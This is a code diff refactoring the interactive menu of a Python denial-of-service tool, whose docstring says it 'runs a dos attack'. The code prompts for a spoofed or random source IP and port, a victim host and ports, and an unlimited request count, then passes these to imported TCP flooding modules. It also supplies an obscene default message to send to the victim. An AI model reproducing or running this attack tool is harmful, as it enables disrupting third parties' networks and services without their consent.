@@ -1,17 +1,18 @@
-def main():
-    try:
-        import socket
-        import os
-        from os import path
-        import sys
-        if os.name == 'nt':
-            from colorama import init
-            init(convert=True)
-        sys.path.insert(0, path.dirname(path.dirname(path.dirname(__file__))))
-        from core.helper_core import Color, ask_for, notify
-        from core.lib.randoms import random_ip, random_int
-        from core.lib._dos import SS, SM
-        black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
+'runs a dos attack . use it legaly'
+import os
+from core.helper_core import Color, ask_for, notify
+from core.lib.randoms import random_ip, random_int
+from core.lib.dos import SS, SM
+
+if os.name == 'nt':
+    from colorama import init
+    init(convert=True)
+
+class Main:
+    'makes using dos modules possible'
+    def __init__(self):
+
+        _, red, green, yellow, blue, magenta, _, _, reset = Color().GetAllColors()
         print(
             "What is The Type For Now Only TCP Supported : \n"
             "* = Not Supported right now\n"
@@ -22,41 +23,56 @@ def main():
             + magenta + "{000}--> Back To Main Menu" + reset
 
         )
-        CHOICE = str(input("..> "))
-        if CHOICE == "000":
+        choice = str(input("..> "))
+        if choice == "000":
             pass
-        elif CHOICE == "1" or CHOICE == "2":
+        elif choice in ("1", "2"):
+            info = self.get_info(choice)
+            self.run(choice, info)
 
-            SOURCE_IP = ask_for(
-                "Whats The Ip Address You Want To Attack From . " +
-                "Press Enter(Left Empty) To Use A Random Ip : ", 'Using \\| As Source Ip.', default=['', random_ip], args=())
+    @staticmethod
+    def get_info(choice):
+        'gets info from user'
+        source_ip = ask_for(
+            "Whats The Ip Address You Want To Attack From . " +
+            "Press Enter(Left Empty) To Use A Random Ip : ", 'Using \\| As Source Ip.',
+            default=['', random_ip], args=())
 
-            temp = int(random_int(1100, 4000))
-            SOURCE_PORT = ask_for("Whats The Port You Want To Attack From "
-                                 "Left To '-1' To Use A Random Port : ", "Using \\| As Source Port.", type=int, default=[-1, temp], args=())
+        temp = int(random_int(1100, 4000))
+        source_port = ask_for("Whats The Port You Want To Attack From "
+                              "Left To '-1' To Use A Random Port : ", "Using \\| As Source Port.",
+                              type=int, default=[-1, temp], args=())
 
-            VICTIM_IP = ask_for("Whats The Host, Name Or IP You Want To Attack To : ",
-                               "Using Ip Or Hostname \\| As Victim Ip")
-            # SS
-            if CHOICE == "1":
-                VICTIM_PORT = ask_for(
-                                    "Whats The Port You Want To Attack To . Left to -1 To Use 80 : ", 
-                                    "Using \\| As Victim Port.", type=int, default=[-1, 80])
-            elif CHOICE == "2":
-                VICTIM_PORTS = ask_for(
-                                    "What Are The Ports You Want To Attack To . Press Enter (Left Empty) To Use [80, 443] : ", 
-                                    "Using \\| As Victim Ports.", type=list, default=['', [80, 443]])
+        victim_ip = ask_for("Whats The Host, Name Or IP You Want To Attack To : ",
+                            "Using Ip Or Hostname \\| As Victim Ip")
+        # SS
+        if choice == "1":
+            victim_port = ask_for(
+                "Whats The Port You Want To Attack To . Left to -1 To Use 80 : ",
+                "Using \\| As Victim Port.", type=int, default=[-1, 80])
+        elif choice == "2":
+            victim_ports = ask_for(
+                "What Are The Ports You Want To Attack To . Press Enter (Left Empty) To Use \
+                [80, 443] : ",
+                "Using \\| As Victim Ports.", type=list, default=['', [80, 443]])
 
-    
-            COUNT = ask_for("How Much Requests Do You Want To Send (-1 For Infinite) : ", "Count Is \\|")
-            MESSAGE = ask_for("A Message For Your Victim Press Enter (Left Empty) To Use 'Fuck You' : ", "Using \\| As A Message For Victim", default=['', 'Fuck You'])
-            if CHOICE == "1":
+        count = ask_for(
+            "How Much Requests Do You Want To Send (-1 For Infinite) : ", "Count Is \\|")
+        message = ask_for("Message For Your Victim Press Enter (Left Empty) To Use 'Fuck You' : ",
+                          "Using \\| As A Message For Victim", default=['', 'Fuck You'])
+        return (source_ip, victim_ip, int(source_port),
+                victim_port if choice == '1' else victim_ports, int(count), message)
+    @staticmethod
+    def run(choice, info):
+        'Runs a dos attack'
+        try:
+            if choice == "1":
                 SS.run(
-                    SOURCE_IP, VICTIM_IP, int(SOURCE_PORT), int(VICTIM_PORT), int(COUNT), MESSAGE
+                    *info
                 )
-            elif CHOICE == "2":
+            elif choice == "2":
                 SM.run(
-                    SOURCE_IP, VICTIM_IP, int(SOURCE_PORT), VICTIM_PORTS, int(COUNT), MESSAGE
+                    *info
                 )
-    except (EOFError, KeyboardInterrupt):
-        notify("report", "User Requested An Exit.")
+        except (EOFError, KeyboardInterrupt):
+            notify("report", "User Requested An Exit.")
